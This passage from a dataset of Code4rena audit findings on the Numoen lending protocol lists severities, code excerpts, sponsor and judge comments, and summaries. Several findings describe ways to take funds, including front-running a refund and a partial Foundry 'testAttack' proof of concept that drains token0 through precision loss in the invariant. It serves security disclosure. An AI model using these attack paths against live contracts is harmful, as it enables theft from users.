      "impact": "MEDIUM",
      "content": "\n[src/periphery/LendgineRouter.sol#L142](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L142)<br>\n[src/periphery/LendgineRouter.sol#L87-L124](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L87-L124)<br>\n[src/periphery/LendgineRouter.sol#L119-L123](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L119-L123)<br>\n[src/periphery/Payment.sol#L44-L46](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/Payment.sol#L44-L46)\n\nWhen the collateral/speculative token (Token1) is WETH, a borrower could mint Power Tokens and deposit the collateral tokens by sending ETH while calling the payable mint() function in LendgineRouter.sol.\n\nThe exact collateral amount required to be deposited by the borrower is only calculated during minting (due to external swap), which could be lesser than what the borrower has sent for the mint. This means that there will be excess ETH left in LengineRouter contract and they are not automatically refunded to the borrower.\n\nAnyone that sees this opportunity can call refundETH() to retrieve the excess ETH.\n\nThe borrower could retrieve the remaining ETH with a separate call to refundETH(). However, as the calls are not atomic, it is possible for a MEV bot to frontrun the borrower and steal the ETH too.\n\nFurthermore, there are no documentation and test cases that advise or handle this issue.\n\n### Proof of Concept\n\nFirst, call payable mint() in LendgineRouter contract with the required ETH amount for collateral.\n\n    function mint(MintParams calldata params) external payable checkDeadline(params.deadline) returns (uint256 shares) {\n\n[src/periphery/LendgineRouter.sol#L142](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L142)\n\nLendgineRouter.mintCallback() will be triggered, which will perform the external swap of the borrowed token0 to token1 on uniswap. The collateralSwap value (token1) is only calculated and known after the successful swap. Both swapped token1 and borrowed token1 are then sent to Lendgine contract (msg.sender).\n\n    // swap all token0 to token1\n    uint256 collateralSwap = swap(\n      decoded.swapType,\n      SwapParams({\n        tokenIn: decoded.token0,\n        tokenOut: decoded.token1,\n        amount: SafeCast.toInt256(amount0),\n        recipient: msg.sender\n      }),\n      decoded.swapExtraData\n    );\n\n    // send token1 back\n    SafeTransferLib.safeTransfer(decoded.token1, msg.sender, amount1);\n\n[src/periphery/LendgineRouter.sol#L87-L124](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L87-L124)\n\nAfter that, mintCallback() will continue to calculate the remaining token1 required to be paid by the borrower (collateralIn value).\n\nDepending on the external swap, the collateralSwap (token1) value could be higher than expected, resulting in a lower collateralIn value. A small collateralIn value means that less ETH is required to be paid by the borrower (via the pay function), resulting in excess ETH left in the LengineRouter contract. However, the excess ETH is not automatically refunded by the mint() call.\n\nNote: For WETH, the pay() uses the ETH balance deposited and wrap it before transferring to Lendgine contract.\n\n    // pull the rest of tokens from the user\n    uint256 collateralIn = collateralTotal - amount1 - collateralSwap;\n    if (collateralIn > decoded.collateralMax) revert AmountError();\n\n    pay(decoded.token1, decoded.payer, msg.sender, collateralIn);\n\n[src/periphery/LendgineRouter.sol#L119-L123](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/LendgineRouter.sol#L119-L123)\n\nA MEV bot or anyone that see this opportunity can call refundETH() to retrieve the excess ETH.\n\n    function refundETH() external payable {\n    \tif (address(this).balance > 0) SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);\n    }\n\n[src/periphery/Payment.sol#L44-L46](https://github.com/code-423n4/2023-01-numoen/blob/main/src/periphery/Payment.sol#L44-L46)\n\n### Recommended Mitigation Steps\n\nAutomatically refund any excess ETH to the borrower.\n\n**[kyscott18 (Numoen) acknowledged and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/174#issuecomment-1423123115):**\n > We expect this issue to be mitigated by a user using the multicall feature of our contract. When expecting to receive eth or not spending the total amount of eth sent, a multicall should be called with the second call calling refundEth() to sweep up the rest of the eth left over in the contract. Because the multicall is atomic, no bot can frontrun the user. \n> \n> This situation is also present in Uniswap V3 and there has been some debate about it. For me, the general consensus is that it is not an issue as refundEth() and multicall() are expected to be used, and not using this is the fault of the user.\n\n**[berndartmueller (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/174#issuecomment-1429969569):**\n > It is the responsibility of the user to use the contracts appropriately (e.g. using `multicall(..)`) to make sure leftover funds are sent out. However, due to the lack of documentation to properly educate about the usage of multicall, I consider Medium severity to be appropriate. \n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability that allows a borrower to mint Power Tokens and deposit collateral tokens (Token1) by sending ETH while calling the payable mint() function in LendgineRouter.sol. Depending on the external swap, the collateralSwap (Token1) value could be higher than expected, resulting in a lower collateralIn value. A small collateralIn value means that less ETH is required to be paid by the borrower, resulting in excess ETH left in the LengineRouter contract. This excess ETH is not automatically refunded by the mint() call, leaving it open to anyone that sees this opportunity to call refundETH() and retrieve the ETH. Furthermore, there are no documentation or test cases that advise or handle this issue.\n\nThe recommended mitigation step to this vulnerability is to automatically refund any excess ETH to the borrower. This should ensure that no excess ETH remains in the LengineRouter contract and any ETH sent by the borrower is refunded back to them.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/174",
      "tags": [],
      "finders": [
        "peakbolt",
        "rvierdiiev  adeolu"
      ]
    },
    {
      "id": "6514",
      "title": "[M-04] Wrong init code hash",
      "impact": "MEDIUM",
      "content": "\nAn init code hash is used to calculate the address of UniswapV2 pair contract. But the init code hash is not same as the latest UniswapV2 repository.\n\n### Proof of Concept\n\nUniswapV2Library.pairFor uses the following value as the init code hash of UniswapV2Pair.\n\n        hex\"e18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303\" // init code hash\n\nBut it is different from the [init code hash](https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L24) of the uniswap v2 repository.\n\nI tested this using one of the top UniswapV2 pairs. DAI-USDC is in the third place [here](https://v2.info.uniswap.org/pairs).\n\nThe token addresses are as follows:\n\nDAI: 0x6B175474E89094C44Da98b954EedeAC495271d0F\n\nUSDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\n\nAnd the current UniswapV2Factory address is 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f [here](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory).\n\nThe pair address calculated is 0x6983E2Da04353C31c7C42B0EA900a40B1D5bf845. And we can't find pair contract in the address.\n\nSo I think the old version of UniswapV2Factory and pair are used here. And it can cause a risk when liquidity is not enough for the pair.\n\n### Recommended Mitigation Steps\n\nIntegrate the latest version of UniswapV2.\n\n**[kyscott18 (Numoen) acknowledged and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/206#issuecomment-1423227359):**\n > I should have been more specific, but the init code hash that I submitted is the sushiswap one.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the UniswapV2Library.sol file. The vulnerability is caused by an incorrect init code hash being used to calculate the address of UniswapV2 pair contracts. This incorrect init code hash is different from the init code hash found in the latest version of the UniswapV2 repository. The bug was identified through manual review.\n\nThe impact of this vulnerability is that the address of the UniswapV2 pair contract would be calculated incorrectly, potentially resulting in liquidity issues. This was tested using one of the top UniswapV2 pairs, DAI-USDC, and the calculated pair address was not found.\n\nThe recommended mitigation step for this vulnerability is to integrate the latest version of UniswapV2. This will ensure that the correct init code hash is being used, and the address of the UniswapV2 pair contract will be calculated correctly.",
      "quality_score": 5,
      "rarity_score": 4.666666666666667,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/206",
      "tags": [
        "Uniswap"
      ],
      "finders": [
        "nadin",
        "hansfriese"
      ]
    },
    {
      "id": "6513",
      "title": "[M-03] Economical games that can be played to gain MEV",
      "impact": "MEDIUM",
      "content": "\n*Disclaimer from warden: Developers did an extremely good job writing the protocol, however, these are some aspects that I think are missed in the design stage and can be considered. Look at it as a food for thought in future designs.*\n\n### Impact\n\n#### How the invariant works\n\nThe invariant of the project is a power formula that follows:\n\n    k = x − (p_0 + (-1/2) * y)^2\n\nWhere it is implemented by the code below:\n\n```solidity\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n```\n\nWhere `x` is equal to `scale0`, y is equal to `scale1` and `p0` is the upper bound. The graph that draws the acceptable point by the invariant is shown below:\n\n[invariant image](https://user-images.githubusercontent.com/18353616/216128438-a43afa14-c96d-413e-9fc5-5279da6fc852.png)\n\nWe can see that the `scale1` does not put a hard cap on `scale0`, but `scale0` does. Also the upper half of the plot is not acceptable by the plot. Overall, it is expected by the protocol that the \\`(scale0, scale1) stays on the curve on the bottom.<br>\nThe derivative of the equation is:\n\n    dx/dy = x/2 - p0\n    or\n    d(scale0)/d(scale1) = scale1 / 2 - p0\n\nWhich means whenever the price of the two tokens is different than this derivative, there is an arbitrage opportunity. The reason `p0` is called upper bound is that the protocol only anticipates the price fraction until the price of asset1 is p0 times the price of asset0 (The curve needs scale1 to be less than zero to support lower prices which is not possible). when `scale1 = 2*p0`, the price of the scale1/scale0 is zero and scale0 is infinite times more valuable than scale1 token. This is the value used to make sure a position is never undercollateralized.\n\n#### The problem\n\nThe liquidity market of a `lendgine` is revolved around `upperbound`. Liquidity providers are looking for the highest `upperbound` possible where the borrowers are providing the most collateral. And the borrowers are looking for the lowest `upperbound` possible where they lock in the least collateral for the most liquidity. Therefore, there should be a middle ground reached by the two sides. The middle ground for the both side is an uppderbound that is far away from the current price, where the liquidity providers feel safe, and is close enough to the actual price that the borrowers find the fees they pay logical. However, if the `upperbound` is a function of how close it is to the actual price, and the actual relative price of the two tokens is volatile, accepted `upperbound` will change through time as well. Therefore we can expect that for two tokens, the liquidity will be moving from one market to another as the accepted `upperbound` value changes. This means that if a lendgine is busy one day, might not be so busy the other day with the price change. This is not a problem by itself, but can leave some liquidity providers behind in locked markets which is explained in the proof of concept.\n\nThe second problem comes from the fact that while the lendgine algorithm makes sure a position is never undercollateralized, it does not value bigger markets more than the smaller ones. This means that a lender while lending, only cares about the smallest `upperbound` possible and the liquidity market would be basically a set of price bids, if a borrwer wants to borrow amount `B` from the whole market, starts from the smallest `upperbound` and if there is not enough liquidity in the smaller one, it makes its way up until he has `B` borrowed. (of course he will consider the fee that he should pay) Therefore, this would cause the liquidity providing market to be extremely scattered, and for each lendgine, liquidity providing is highly centralized (since many lendgines can be made and the upper bound value can be controversial).\n\n### Proof of concept\n\nLets consider several cases: (These also happen in other markets, but can get exaggerated here)\n\n*   Imagine a liquidity market which has up to a considerable percentage of its liquidity borrowed, if the safe `upperbound` for the liquidators starts to move down the protocol allows the earliest liquidators to opt-out, creating a certain kind of MEV for the fastest liquidators. While the remaining providers will get more fees, the protocol favors the fastest actors to decide when to opt-out. In the extreme case of base token crashing down, there would be a race between borrowers to lock the money and the earliest liquidity providers to get out.\n*   Liquidity providers might mint some shares for themselves in times of uncertainty, just to have the option to quickly opt-out of the protocol if they need. They can give back the borrowed amount and withdraw the said amount in one transaction. while if they do not lock the funds, they either have to take the funds out or someone else might come and get lock the funds.\n\n### Recommended Mitigation Steps\n\nThere are two things that could be done in the future to mitigate issues:\n\n*   value the bigger markets more than the smaller ones, where users are incentivized to use the bigger markets.\n*   Use an aggregator that crawls over several markets and let liquidity providers to stake in a range of liquidity.\n\n**[kyscott18 (Numoen) acknowledged and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/242#issuecomment-1424467860):**\n > Really well written and appreciated.\n\n\n\n***\n\n",
      "summary": "\nA bug report was made regarding the invariant of a project and the issues that arise from it. The invariant is a power formula that is implemented in the code and is represented by a graph. The graph shows that the scale1 does not put a hard cap on scale0, but scale0 does. The derivative of the equation is also found. The issue arises when the upperbound is a function of how close it is to the actual price, and the actual relative price of the two tokens is volatile. This means that liquidity will be moving from one market to another as the accepted upperbound value changes. This can leave some liquidity providers behind in locked markets. Furthermore, the algorithm does not value bigger markets more than the smaller ones.\n\nTo mitigate these issues, it is recommended to value the bigger markets more than the smaller ones, where users are incentivized to use the bigger markets. Additionally, an aggregator should be used that crawls over several markets and let liquidity providers to stake in a range of liquidity.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/242",
      "tags": [],
      "finders": [
        "Allarious"
      ]
    },
    {
      "id": "6512",
      "title": "[M-02] First liquidity provider will suffer from revert or fund loss",
      "impact": "MEDIUM",
      "content": "\n[src/periphery/LiquidityManager.sol#L135](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/periphery/LiquidityManager.sol#L135)<br>\n\nThe first liquidity depositor should supply three input values `amount0Min, amount1Min, liquidity` via `AddLiquidityParams` but these three values should meet an accurate relationship, or else the depositor will suffer from revert or fund loss\n\n### Proof of Concept\n\nThe LPs are supposed to use the function `LiquidityManager.addLiquidity(AddLiquidityParams calldata params)` to add liquidity.<br>\nWhen the pool is not empty, this function calculates the `amount0, amount1` according to the current total liquidity and the requested liquidity.<br>\nBut when the pool is empty, these amounts are supposed to be provided by the caller.\n\n```solidity\nLiquidityManager.sol\n\n120:   struct AddLiquidityParams {\n121:     address token0;\n122:     address token1;\n123:     uint256 token0Exp;\n124:     uint256 token1Exp;\n125:     uint256 upperBound;\n126:     uint256 liquidity;\n127:     uint256 amount0Min;\n128:     uint256 amount1Min;\n129:     uint256 sizeMin;\n130:     address recipient;\n131:     uint256 deadline;\n132:   }\n133:\n134:   /// @notice Add liquidity to a liquidity position\n135:   function addLiquidity(AddLiquidityParams calldata params) external payable checkDeadline(params.deadline) {\n136:     address lendgine = LendgineAddress.computeAddress(\n137:       factory, params.token0, params.token1, params.token0Exp, params.token1Exp, params.upperBound\n138:     );\n139:\n140:     uint256 r0 = ILendgine(lendgine).reserve0();\n141:     uint256 r1 = ILendgine(lendgine).reserve1();\n142:     uint256 totalLiquidity = ILendgine(lendgine).totalLiquidity();\n143:\n144:     uint256 amount0;\n145:     uint256 amount1;\n146:\n147:     if (totalLiquidity == 0) {\n148:       amount0 = params.amount0Min;//@audit-info caller specifies the actual reserve amount\n149:       amount1 = params.amount1Min;//@audit-info\n150:     } else {\n151:       amount0 = FullMath.mulDivRoundingUp(params.liquidity, r0, totalLiquidity);\n152:       amount1 = FullMath.mulDivRoundingUp(params.liquidity, r1, totalLiquidity);\n153:     }\n154:\n155:     if (amount0 < params.amount0Min || amount1 < params.amount1Min) revert AmountError();\n156:\n157:     uint256 size = ILendgine(lendgine).deposit(\n158:       address(this),\n159:       params.liquidity,\n160:       abi.encode(\n161:         PairMintCallbackData({\n162:           token0: params.token0,\n163:           token1: params.token1,\n164:           token0Exp: params.token0Exp,\n165:           token1Exp: params.token1Exp,\n166:           upperBound: params.upperBound,\n167:           amount0: amount0,\n168:           amount1: amount1,\n169:           payer: msg.sender\n170:         })\n171:       )\n172:     );\n173:     if (size < params.sizeMin) revert AmountError();\n174:\n175:     Position memory position = positions[params.recipient][lendgine]; // SLOAD\n176:\n177:     (, uint256 rewardPerPositionPaid,) = ILendgine(lendgine).positions(address(this));\n178:     position.tokensOwed += FullMath.mulDiv(position.size, rewardPerPositionPaid - position.rewardPerPositionPaid, 1e18);\n179:     position.rewardPerPositionPaid = rewardPerPositionPaid;\n180:     position.size += size;\n181:\n182:     positions[params.recipient][lendgine] = position; // SSTORE\n183:\n184:     emit AddLiquidity(msg.sender, lendgine, params.liquidity, size, amount0, amount1, params.recipient);\n185:   }\n\n```\n\nThen how does the caller decide these amounts? These values should be chosen very carefully as we explain below.\n\nThe whole protocol is based on its invariant that is defined in `Pair.invariant()`.<br>\nThe invariant is actually ensuring that `a+b-c-d` stays not negative for all trades (interactions regarding reserve/liquidity).<br>\nOnce `a+b-c-d` becomes strictly positive, anyone can call `swap()` function to pull the `token0` of that amount without any cost.\n\n```solidity\nPair.sol\n52:   /// @inheritdoc IPair\n53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n58:\n59:     if (scale1 > 2 * upperBound) revert InvariantError();\n60:\n61:     uint256 a = scale0 * 1e18;\n62:     uint256 b = scale1 * upperBound;\n63:     uint256 c = (scale1 * scale1) / 4;\n64:     uint256 d = upperBound * upperBound;\n65:\n66:     return a + b >= c + d;//@audit-info if strict inequality holds, anyone can pull token0 using swap()\n67:   }\n```\n\nSo going back to the question, if the LP choose the values `amount0, amount1, liquidity` not accurately, the transaction reverts or `a+b-c-d` becomes greater than zero.\n\nGenerally, liquidity providers do not specify the desired liquidity amount in other protocols.<br>\nDuring the conversation with the sponsor team, it is understood that they avoided the calculation of `liquidity` from `amount0, amount1` because it is too complicated.<br>\nOff-chain calculation will be necessary to help the situation, and this would limit the growth of the protocol.<br>\nIf any other protocol is going to integrate Numoen, they will face the same problem.\n\nI did some calculations and got the formula for the liquidity as below.\n\n\n$L = \\frac{PCy+C^2x+\\sqrt{2PC^3xy+C^4x^2}}{2P^2}$\n\nwhere $C=10^{18}$, $x$ is `amount0`, $y$ is `amount1`, $P$ is the `upperBound`, $L$ is the liquidity amount that should be used.\n\nBecause the LP will almost always suffer revert or fund loss without help of off-chain calculation, I submit this as a medium finding.<br>\nI would like to note that there still exists a mitigation (not that crazy).<br>\nAs a side note, it would be very helpful to add new preview functions.\n\n### Recommended Mitigation Steps\n\nAdd a functionality to calculate the liquidity for the first deposit on-chain.<br>\nAnd it is also recommended to add preview functions.\n\n**[kyscott18 (Numoen) acknowledged and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/254#issuecomment-1423052977):**\n > We still think it is better off to pass in the amount of liquidity as part of the input. It won't result in loss of funds for first time depositors because they can know before time if the amount of tokens they supply match up to the amount of liquidity that they specified or not. I will take a look at this formula in more detail.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the code of the Numoen protocol which affects the first liquidity depositor. The bug means that the three input values `amount0Min, amount1Min, liquidity` must be supplied via `AddLiquidityParams` and must meet an accurate relationship. If not, the depositor will suffer from a revert or fund loss. \n\nThe whole protocol is based on its invariant that is defined in `Pair.invariant()`. This invariant ensures that `a+b-c-d` stays not negative for all trades. If `a+b-c-d` becomes strictly positive, anyone can call `swap()` function to pull the `token0` of that amount without any cost.\n\nTo calculate the liquidity, the formula is: \n$\nL = \\frac{PCy+C^2x+\\sqrt{2PC^3xy+C^4x^2}}{2P^2}\n$\nwhere $C=10^{18}$, $x$ is `amount0`, $y$ is `amount1`, $P$ is the `upperBound`, $L$ is the liquidity amount that should be used.\n\nThe bug was found using manual review. The recommended mitigation steps are to add a functionality to calculate the liquidity for the first deposit on-chain and to add preview functions.",
      "quality_score": 3.001335113484646,
      "rarity_score": 0.0053404539385847796,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/254",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "6511",
      "title": "[M-01] Fee on transfer tokens will not behave as expected",
      "impact": "MEDIUM",
      "content": "\nIn Numoen, it does not specifically restrict the type of ERC20 collateral used for borrowing.\n\nIf fee on transfer token(s) is/are entailed, it will specifically make `mint()` revert in Lendgine.sol when checking if `balanceAfter < balanceBefore + collateral`.\n\n### Proof of Concept\n\n[File: Lendgine.sol#L71-L102](https://github.com/code-423n4/2023-01-numoen/blob/main/src/core/Lendgine.sol#L71-L102)\n\n```solidity\n  function mint(\n    address to,\n    uint256 collateral,\n    bytes calldata data\n  )\n    external\n    override\n    nonReentrant\n    returns (uint256 shares)\n  {\n    _accrueInterest();\n\n    uint256 liquidity = convertCollateralToLiquidity(collateral);\n    shares = convertLiquidityToShare(liquidity);\n\n    if (collateral == 0 || liquidity == 0 || shares == 0) revert InputError();\n    if (liquidity > totalLiquidity) revert CompleteUtilizationError();\n    // next check is for the case when liquidity is borrowed but then was completely accrued\n    if (totalSupply > 0 && totalLiquidityBorrowed == 0) revert CompleteUtilizationError();\n\n    totalLiquidityBorrowed += liquidity;\n    (uint256 amount0, uint256 amount1) = burn(to, liquidity);\n    _mint(to, shares);\n\n    uint256 balanceBefore = Balance.balance(token1);\n    IMintCallback(msg.sender).mintCallback(collateral, amount0, amount1, liquidity, data);\n    uint256 balanceAfter = Balance.balance(token1);\n\n99:    if (balanceAfter < balanceBefore + collateral) revert InsufficientInputError();\n\n    emit Mint(msg.sender, collateral, shares, liquidity, to);\n  }\n```\n\nAs can be seen from the code block above, line 99 is meant to be reverting when `balanceAfter < balanceBefore + collateral`. So in the case of deflationary tokens, the error is going to be thrown even though the token amount has been received due to the fee factor.\n\n### Recommended Mitigation Steps\n\nConsider:\n\n1.  whitelisting token0 and token1 ensuring no fee-on-transfer token is allowed when a new instance of a market is created using the factory, or\n2.  calculating the balance before and after the transfer of token1 (collateral), and use the difference between those two balances as the amount received rather than using the input amount `collateral` if deflationary token is going to be allowed in the protocol.\n\n**[kyscott18 (Numoen) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1424473440):**\n > Can you give an example of a deflationary token? Does this mean that the balance goes down w.r.t. time or w.r.t being transferred.\n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1424586605):**\n > > Can you give an example of a deflationary token? Does this mean that the balance goes down w.r.t. time or w.r.t being transferred.\n> \n> @kyscott18 - With regard to being transferred.\n> \n> https://github.com/d-xo/weird-erc20#fee-on-transfer is a great resource on this topic.\n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1432808177):**\n > This finding and its duplicates show a valid issue that prevents the use of rebase/FoT tokens with the protocol. As there is no clear mention of the support of non-standard ERC-20 tokens in the Numoen docs or contest README, I consider Medium the appropriate severity.\n\n**[kyscott18 (Numoen) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1447432079):**\n > How is this different from https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L486-L490? If it isn't any different, which I don't think it is, then we will just acknowledge this and be mindful of which token we allow people to list. \n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1448419805):**\n > @kyscott18 - In this specific case of the `mint(..)` function, there is no difference to Uniswap. Both implementations do not work properly for this kind of rebase/FoT tokens. Uniswap V3 is built on a setup of assumptions ([see here](https://github.com/Uniswap/v3-periphery/blob/de9702518fdb3f749eb417e526b08a3167c9e6b6/bug-bounty.md#assumptions)), excluding rebase tokens.\n\n> It becomes a bigger issue if the use of rebase tokens can influence the token balance accounting of other regular ERC-20 token pairs, which is not the case for Numoen.\n\n> One of the other submissions presents further instances in the code which are potentially affected by incorrect token balance accounting caused by rebase/FoT token -> [issue 272](https://github.com/code-423n4/2023-01-numoen-findings/issues/272)\n\n**[kyscott18 (Numoen) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/263#issuecomment-1454362408):**\n > Okay, thanks for clarifying. I think we should mark this as noted by the team because we want to use the same assumptions as uniswap in this case.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the Numoen protocol which allows users to borrow tokens. The vulnerability is that if a fee on transfer token is entailed, it will cause the mint() function in Lendgine.sol to revert when checking if balanceAfter < balanceBefore + collateral. This is due to the fact that the balance after the transfer of the token1 (collateral) is lower than the balance before the transfer, due to the fee factor. To mitigate this vulnerability, it is recommended to either whitelist token0 and token1 to ensure no fee-on-transfer token is allowed when a new instance of a market is created using the factory, or to calculate the balance before and after the transfer of token1 (collateral) and use the difference between those two balances as the amount received rather than using the input amount 'collateral' if deflationary token is going to be allowed in the protocol.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "https://github.com/code-423n4/2023-01-numoen-findings/issues/263",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "0xhacksmithh",
        "Deivitto",
        "peakbolt",
        "RaymondFam",
        "rvierdiiev"
      ]
    },
    {
      "id": "6510",
      "title": "[H-01] Precision loss in the invariant function can lead to loss of funds",
      "impact": "HIGH",
      "content": "\n[src/core/Pair.sol#L56](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56)<br>\n\nAn attacker can steal the funds without affecting the invariant.\n\n### Proof of Concept\n\nWe can say the function `Pair.invariant()` is the heart of the protocol.<br>\nAll the malicious trades should be prevented by this function.\n\n```solidity\nPair.sol\n52:   /// @inheritdoc IPair\n53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss\n57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss\n58:\n59:     if (scale1 > 2 * upperBound) revert InvariantError();\n60:\n61:     uint256 a = scale0 * 1e18;\n62:     uint256 b = scale1 * upperBound;\n63:     uint256 c = (scale1 * scale1) / 4;\n64:     uint256 d = upperBound * upperBound;\n65:\n66:     return a + b >= c + d;\n67:   }\n\n```\n\nThe problem is there is a precision loss in the L56 and L57.<br>\nThe precision loss can result in the wrong invariant check result.<br>\nLet's say the `token0` has 6 decimals and liquidity has more than 24 decimals.<br>\nThen the first `FullMath.mulDiv` will cause significant rounding before it's converted to D18.<br>\nTo clarify the difference I wrote a custom function `invariant()` to see the actual value of `a+b-c-d`.\n\n      function invariant(uint256 amount0, uint256 amount1, uint256 liquidity, uint256 token0Scale, uint256 token1Scale) public view returns (uint256 res) {\n        if (liquidity == 0) {\n            require (amount0 == 0 && amount1 == 0);\n            return 0;\n        }\n\n        // uint256 scale0 = FullMath.mulDiv(amount0* token0Scale, 1e18, liquidity) ;\n        // uint256 scale1 = FullMath.mulDiv(amount1* token1Scale, 1e18, liquidity) ;\n        uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n        uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n        if (scale1 > 2 * upperBound) revert();\n\n        uint256 a = scale0 * 1e18;\n        uint256 b = scale1 * upperBound;\n        uint256 c = (scale1 * scale1) / 4;\n        uint256 d = upperBound * upperBound;\n\n        res = a + b - c - d;\n      }\n\n      function testAudit1() external\n      {\n        uint256 x = 1*10**6;\n        uint256 y = 2 * (5 * 10**24 - 10**21);\n        uint256 liquidity = 10**24;\n        uint256 token0Scale=10**12;\n        uint256 token1Scale=1;\n        emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n\n        x = 1.5*10**6;\n        emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n      }\n\nPut these two functions in the `LiquidityManagerTest.t.sol` and run the case.<br>\nThe result is as below and it shows that while the reserve0 amount changes to 150%, the actual value `a+b-c-d` does not change.\n\n    F:\\SOL\\Code\\Code4rena\\2023-01-numoen>forge test -vv --match-test testAudit1\n    [⠒] Compiling...\n    No files changed, compilation skipped\n\n    Running 1 test for test/LiquidityManagerTest.t.sol:LiquidityManagerTest\n    [PASS] testAudit1() (gas: 10361)\n    Logs:\n      invariant: 0.000000000000000000000000000000000000\n      invariant: 0.000000000000000000000000000000000000\n\n    Test result: ok. 1 passed; 0 failed; finished in 5.74ms\n\nSo what does this mean? We know that if `a+b-c-d` is positive, it means anyone can call `swap()` to withdraw the excess value.<br>\nThe above test shows that the significant change in the token0 reserve amount did not change the value `a+b-c-d`.<br>\nBased on this, I wrote an attack case where dennis pulls 0.5&ast;10&ast;&ast;6 token0 without cost while the invariant stays at zero.<br>\nAlthough the benefit is only 0.5 USDC for this test case, this shows a possibility drawing value without affecting the invariant for pools with low decimals.\n\n```solidity\n  function testAttack() external\n  {\n    // token0 is USDC\n    token0Scale = 6;\n    token1Scale = 18;\n\n    // cuh adds liquidity\n    lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));\n\n    uint256 amount0 = 1.5*10**6;\n    uint256 amount1 = 2 * (5 * 10**24 - 10**21);\n    uint256 liquidity = 10**24;\n\n    token0.mint(cuh, amount0);\n    token1.mint(cuh, amount1);\n\n    vm.startPrank(cuh);\n    token0.approve(address(liquidityManager), amount0);\n    token1.approve(address(liquidityManager), amount1);\n\n    liquidityManager.addLiquidity(\n      